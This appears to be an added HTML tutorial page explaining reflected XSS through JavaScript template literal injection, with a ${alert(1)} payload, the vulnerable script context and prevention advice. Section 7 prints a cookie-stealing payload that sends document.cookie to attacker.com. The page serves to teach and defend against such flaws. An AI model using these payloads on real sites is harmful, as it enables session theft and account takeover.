@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deep Dive: Template Literal Injection (XSS)</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            background-color: #f9f9f9;
+            color: #333;
+            line-height: 1.7;
+        }
+        h1, h2, h3 {
+            color: #2c3e50;
+        }
+        code {
+            background-color: #eee;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+        pre {
+            background-color: #eee;
+            padding: 10px;
+            border-radius: 6px;
+            overflow-x: auto;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid #ccc;
+            padding: 10px;
+            text-align: left;
+        }
+        th {
+            background-color: #f0f0f0;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Deep Dive: Template Literal Injection (XSS)</h1>
+
+<h2>1. Your Payload</h2>
+<pre>GET /?search=${alert(1)}</pre>
+<p>
+    You sent <code>search=${alert(1)}</code> as a query parameter.
+    The name is <strong>search</strong> and the value is <strong>${alert(1)}</strong>.
+</p>
+<p>
+    <code>${}</code> is JavaScript template string interpolation — meaning inside backticks (<code>`</code>), anything inside <code>${}</code> is evaluated as code.
+</p>
+
+<h2>2. How it Reflected</h2>
+<pre>&lt;script&gt;
+    var message = `0 search results for '${alert(1)}'`;
+    document.getElementById('searchMessage').innerText = message;
+&lt;/script&gt;
+</pre>
+<p>
+    Your input <code>${alert(1)}</code> was reflected inside a JavaScript template literal within a <code>&lt;script&gt;</code> block.
+</p>
+
+<h2>3. Why Your Payload Worked</h2>
+<p>
+    In template strings, anything inside <code>${}</code> gets executed. So <code>${alert(1)}</code> immediately called <code>alert(1)</code> when the page loaded.
+</p>
+
+<h2>4. Real Flow in the Browser</h2>
+<ul>
+    <li>Page loads</li>
+    <li>Browser executes the &lt;script&gt;</li>
+    <li>Template string <code>`0 search results for '${alert(1)}'`</code> is parsed</li>
+    <li><code>alert(1)</code> is called immediately</li>
+    <li>Alert pops up!</li>
+</ul>
+
+<h2>5. What Made it Vulnerable?</h2>
+<ul>
+    <li>User input was directly inserted into a template literal inside JavaScript.</li>
+    <li>No escaping or sanitization was done.</li>
+</ul>
+
+<h2>6. How Developers Should Prevent It</h2>
+<ul>
+    <li>Escape any <code>${</code> in user input before inserting into template literals (e.g., replace with <code>\${</code>).</li>
+    <li>Don't dynamically generate JavaScript with unsanitized user data.</li>
+    <li>Prefer inserting user input as plain text into HTML DOM elements, not into JavaScript code.</li>
+</ul>
+
+<h2>7. Why is This Dangerous?</h2>
+<p>
+    Instead of <code>alert(1)</code>, an attacker could inject:
+</p>
+<pre>${fetch('https://attacker.com/steal?cookie='+document.cookie)}</pre>
+<p>
+    This could:
+</p>
+<ul>
+    <li>Steal cookies</li>
+    <li>Steal sensitive data</li>
+    <li>Perform account takeover</li>
+</ul>
+
+<h2>8. Step-by-Step Summary</h2>
+<table>
+    <thead>
+        <tr>
+            <th>Step</th>
+            <th>What Happened</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>1</td>
+            <td>Sent <code>search=${alert(1)}</code> as GET request</td>
+        </tr>
+        <tr>
+            <td>2</td>
+            <td>Server reflected it into a JavaScript template literal</td>
+        </tr>
+        <tr>
+            <td>3</td>
+            <td>Browser parsed and executed <code>${alert(1)}</code></td>
+        </tr>
+        <tr>
+            <td>4</td>
+            <td>JavaScript engine called <code>alert(1)</code></td>
+        </tr>
+        <tr>
+            <td>5</td>
+            <td>Alert box popped up!</td>
+        </tr>
+    </tbody>
+</table>
+
+<h2>🧠 Final Hacker Concept to Remember</h2>
+<blockquote>
+    In JavaScript template literals, anything inside <code>${}</code> will <strong>execute as code</strong>, not just be printed.
+    <br>
+    Always review user input being reflected inside backtick <code>`</code> contexts.
+</blockquote>
+
+</body>
+</html>
